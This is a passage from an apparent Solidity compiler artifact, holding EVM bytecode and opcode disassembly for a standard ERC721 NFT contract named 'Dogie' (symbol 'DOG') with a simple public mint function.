5b82525050565b6000611a3e82611eed565b611a488185611f03565b9350611a58818560208601612032565b611a6181612169565b840191505092915050565b6000611a7782611ef8565b611a818185611f14565b9350611a91818560208601612032565b611a9a81612169565b840191505092915050565b6000611ab2602d83611f14565b9150611abd8261217a565b604082019050919050565b6000611ad5603283611f14565b9150611ae0826121c9565b604082019050919050565b6000611af8602583611f14565b9150611b0382612218565b604082019050919050565b6000611b1b601c83611f14565b9150611b2682612267565b602082019050919050565b6000611b3e602483611f14565b9150611b4982612290565b604082019050919050565b6000611b61601983611f14565b9150611b6c826122df565b602082019050919050565b6000611b84602983611f14565b9150611b8f82612308565b604082019050919050565b6000611ba7602083611f14565b9150611bb282612357565b602082019050919050565b6000611bca601883611f14565b9150611bd582612380565b602082019050919050565b6000611bed603083611f14565b9150611bf8826123a9565b604082019050919050565b6000611c10602183611f14565b9150611c1b826123f8565b604082019050919050565b6000611c33603d83611f14565b9150611c3e82612447565b604082019050919050565b611c5281612019565b82525050565b6000602082019050611c6d6000830184611a15565b92915050565b6000608082019050611c886000830187611a15565b611c956020830186611a15565b611ca26040830185611c49565b8181036060830152611cb48184611a33565b905095945050505050565b6000602082019050611cd46000830184611a24565b92915050565b60006020820190508181036000830152611cf48184611a6c565b905092915050565b60006020820190508181036000830152611d1581611aa5565b9050919050565b60006020820190508181036000830152611d3581611ac8565b9050919050565b60006020820190508181036000830152611d5581611aeb565b9050919050565b60006020820190508181036000830152611d7581611b0e565b9050919050565b60006020820190508181036000830152611d9581611b31565b9050919050565b60006020820190508181036000830152611db581611b54565b9050919050565b60006020820190508181036000830152611dd581611b77565b9050919050565b60006020820190508181036000830152611df581611b9a565b9050919050565b60006020820190508181036000830152611e1581611bbd565b9050919050565b60006020820190508181036000830152611e3581611be0565b9050919050565b60006020820190508181036000830152611e5581611c03565b9050919050565b60006020820190508181036000830152611e7581611c26565b9050919050565b6000602082019050611e916000830184611c49565b92915050565b6000611ea1611eb2565b9050611ead8282612097565b919050565b6000604051905090565b600067ffffffffffffffff821115611ed757611ed6612126565b5b611ee082612169565b9050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600082825260208201905092915050565b6000611f3082612019565b9150611f3b83612019565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611f7057611f6f6120c8565b5b828201905092915050565b6000611f8682612019565b9150611f9183612019565b925082821015611fa457611fa36120c8565b5b828203905092915050565b6000611fba82611ff9565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b60005b83811015612050578082015181840152602081019050612035565b8381111561205f576000848401525b50505050565b6000600282049050600182168061207d57607f821691505b60208210811415612091576120906120f7565b5b50919050565b6120a082612169565b810181811067ffffffffffffffff821117156120bf576120be612126565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20746f6b656e20616c7265616479206d696e74656400000000600082015250565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b7f4552433732313a206d696e7420746f20746865207a65726f2061646472657373600082015250565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b7f4552433732314d65746164617461203a2055524920717565727920666f72206e60008201527f6f6e6578697374656e7420746f6b656e00000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b61249f81611faf565b81146124aa57600080fd5b50565b6124b681611fc1565b81146124c157600080fd5b50565b6124cd81611fcd565b81146124d857600080fd5b50565b6124e481612019565b81146124ef57600080fd5b5056fe697066733a2f2f516d6472796f4578706745515151674a506f727577474a795a6d7a3653715634465254583169373343543369586ea26469706673582212209aa804f7e23260d390ec7ce540589db091d18016e1f41b07a8e632ff977524f764736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x446F676965000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x444F470000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x96 SWAP3 SWAP2 SWAP1 PUSH3 0xC0 JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xAF SWAP3 SWAP2 SWAP1 PUSH3 0xC0 JUMP JUMPDEST POP POP POP PUSH1 0x0 PUSH1 0x6 DUP2 SWAP1 SSTORE POP PUSH3 0x1D5 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH3 0xCE SWAP1 PUSH3 0x170 JUMP JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH3 0xF2 JUMPI PUSH1 0x0 DUP6 SSTORE PUSH3 0x13E JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH3 0x10D JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x13E JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x13E JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x13D JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x120 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x14D SWAP2 SWAP1 PUSH3 0x151 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x16C JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x152 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x189 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH3 0x1A0 JUMPI PUSH3 0x19F PUSH3 0x1A6 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x255D DUP1 PUSH3 0x1E5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x100 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x97 JUMPI DUP1 PUSH4 0xB88D4FDE GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xB88D4FDE EQ PUSH2 0x2AD JUMPI DUP1 PUSH4 0xC2229FEA EQ PUSH2 0x2C9 JUMPI DUP1 PUSH4 0xC87B56DD EQ PUSH2 0x2D3 JUMPI DUP1 PUSH4 0xE985E9C5 EQ PUSH2 0x303 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x225 JUMPI DUP1 PUSH4 0x78CE9035 EQ PUSH2 0x255 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x273 JUMPI DUP1 PUSH4 0xA22CB465 EQ PUSH2 0x291 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xD3 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x19F JUMPI DUP1 PUSH4 0x42842E0E EQ PUSH2 0x1BB JUMPI DUP1 PUSH4 0x6352211E EQ PUSH2 0x1D7 JUMPI DUP1 PUSH4 0x6E02007D EQ PUSH2 0x207 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x1FFC9A7 EQ PUSH2 0x105 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x135 JUMPI DUP1 PUSH4 0x81812FC EQ PUSH2 0x153 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x183 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x11F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x11A SWAP2 SWAP1 PUSH2 0x198E JUMP JUMPDEST PUSH2 0x333 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13D PUSH2 0x415 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x168 SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x4A7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17A SWAP2 SWAP1 PUSH2 0x1C58 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x198 SWAP2 SWAP1 PUSH2 0x194E JUMP JUMPDEST PUSH2 0x4ED JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1B4 SWAP2 SWAP1 PUSH2 0x1838 JUMP JUMPDEST PUSH2 0x605 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1D0 SWAP2 SWAP1 PUSH2 0x1838 JUMP JUMPDEST PUSH2 0x665 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1F1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1EC SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x685 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FE SWAP2 SWAP1 PUSH2 0x1C58 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x20F PUSH2 0x70C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21C SWAP2 SWAP1 PUSH2 0x1E7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x23A SWAP2 SWAP1 PUSH2 0x17CB JUMP JUMPDEST PUSH2 0x716 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x24C SWAP2 SWAP1 PUSH2 0x1E7C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x25D PUSH2 0x7CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x26A SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x27B PUSH2 0x7EA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x288 SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2A6 SWAP2 SWAP1 PUSH2 0x190E JUMP JUMPDEST PUSH2 0x87C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2C7 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2C2 SWAP2 SWAP1 PUSH2 0x188B JUMP JUMPDEST PUSH2 0x892 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2D1 PUSH2 0x8F4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2ED PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2E8 SWAP2 SWAP1 PUSH2 0x19E8 JUMP JUMPDEST PUSH2 0x946 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2FA SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x31D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x318 SWAP2 SWAP1 PUSH2 0x17F8 JUMP JUMPDEST PUSH2 0x995 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x32A SWAP2 SWAP1 PUSH2 0x1CBF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH32 0x80AC58CD00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ DUP1 PUSH2 0x3FE JUMPI POP PUSH32 0x5B5E139F00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ JUMPDEST DUP1 PUSH2 0x40E JUMPI POP PUSH2 0x40D DUP3 PUSH2 0xA29 JUMP JUMPDEST JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH2 0x424 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x450 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x49D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x472 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x49D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x480 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4B2 DUP3 PUSH2 0xA93 JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4F8 DUP3 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x569 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x560 SWAP1 PUSH2 0x1E3C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x588 PUSH2 0xADE JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x5B7 JUMPI POP PUSH2 0x5B6 DUP2 PUSH2 0x5B1 PUSH2 0xADE JUMP JUMPDEST PUSH2 0x995 JUMP JUMPDEST JUMPDEST PUSH2 0x5F6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5ED SWAP1 PUSH2 0x1E5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x600 DUP4 DUP4 PUSH2 0xAE6 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x616 PUSH2 0x610 PUSH2 0xADE JUMP JUMPDEST DUP3 PUSH2 0xB9F JUMP JUMPDEST PUSH2 0x655 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x64C SWAP1 PUSH2 0x1CFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x660 DUP4 DUP4 DUP4 PUSH2 0xC34 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x680 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x892 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x691 DUP4 PUSH2 0xF2E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x703 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6FA SWAP1 PUSH2 0x1DFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x787 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x77E SWAP1 PUSH2 0x1DBC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x35 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x24F3 PUSH1 0x35 SWAP2 CODECOPY DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x1 DUP1 SLOAD PUSH2 0x7F9 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x825 SWAP1 PUSH2 0x2065 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x872 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x847 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x872 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x855 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x88E PUSH2 0x887 PUSH2 0xADE JUMP JUMPDEST DUP4 DUP4 PUSH2 0xF6B JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x8A3 PUSH2 0x89D PUSH2 0xADE JUMP JUMPDEST DUP4 PUSH2 0xB9F JUMP JUMPDEST PUSH2 0x8E2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8D9 SWAP1 PUSH2 0x1CFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x8EE DUP5 DUP5 DUP5 DUP5 PUSH2 0x10D8 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x900 CALLER PUSH1 0x6 SLOAD PUSH2 0x1134 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH32 0xEF1DA42F89C42F48BEFA143007E6F5EFD84A2D1CC3DC97C5EDD2D3373220F66D PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH1 0x1 PUSH1 0x6 SLOAD PUSH2 0x93E SWAP2 SWAP1 PUSH2 0x1F25 JUMP JUMPDEST PUSH1 0x6 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x951 DUP3 PUSH2 0x1152 JUMP JUMPDEST PUSH2 0x990 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x987 SWAP1 PUSH2 0x1E1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x1FFC9A700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA9C DUP2 PUSH2 0x1152 JUMP JUMPDEST PUSH2 0xADB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xAD2 SWAP1 PUSH2 0x1DFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST DUP2 PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB59 DUP4 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xBAB DUP4 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xBED JUMPI POP PUSH2 0xBEC DUP2 DUP6 PUSH2 0x995 JUMP JUMPDEST JUMPDEST DUP1 PUSH2 0xC2B JUMPI POP DUP4 PUSH20 